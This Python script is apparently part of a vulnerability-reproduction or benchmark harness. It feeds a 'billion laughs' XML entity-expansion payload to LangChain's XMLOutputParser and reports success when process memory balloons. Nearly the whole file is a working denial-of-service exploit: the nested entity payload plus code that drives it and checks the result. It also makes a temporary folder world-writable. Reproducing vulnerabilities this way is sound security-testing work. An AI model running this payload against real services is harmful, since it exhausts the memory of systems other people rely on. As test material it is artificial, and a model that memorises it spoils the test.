#!/usr/bin/env python3
import os
import sys
import traceback
import psutil
import time

sys.path.insert(0, os.path.abspath("../../../codebase"))
sys.path.insert(0, os.path.abspath("../../../codebase/libs/langchain"))

os.makedirs("./tmp", exist_ok=True)
os.chmod("./tmp", 0o777)

LOG_FILE = "./tmp/exploit.log"
MEMORY_THRESHOLD_MB = 100

def run_exploit():
    try:
        from langchain.output_parsers import XMLOutputParser
        
        process = psutil.Process(os.getpid())
        baseline_memory = process.memory_info().rss / 1024 / 1024
        
        payload = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
         <!ENTITY lol "lol">
         <!ELEMENT lolz (#PCDATA)>
         <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
         <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
         <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
         <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
         <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
         <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
         <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
         <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
         <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>"""
        
        parser = XMLOutputParser()
        result = parser.parse(payload)
        
        time.sleep(0.5)
        current_memory = process.memory_info().rss / 1024 / 1024
        memory_increase = current_memory - baseline_memory
        
        return f"Exploit complete! Memory increased by {memory_increase:.2f}MB (from {baseline_memory:.2f}MB to {current_memory:.2f}MB)"
    except Exception as e:
        if "entity" in str(e).lower() and "limit" in str(e).lower():
            return f"Exploit failed: Protection detected - {str(e)}"
        else:
            return f"Exploit encountered an error: {str(e)}"

if __name__ == '__main__':
    try:
        result = run_exploit()
        with open(LOG_FILE, "w") as log:
            log.write(f"{result}\n")
        
        if "Exploit complete" in result:
            print(result)
            exit(0)
        else:
            print(result)
            exit(1)
    except Exception as e:
        with open(LOG_FILE, "w") as log:
            log.write(f"An error occurred: {str(e)}\n")
            log.write(traceback.format_exc())
        print(f"An error occurred: {str(e)}")
        exit(1)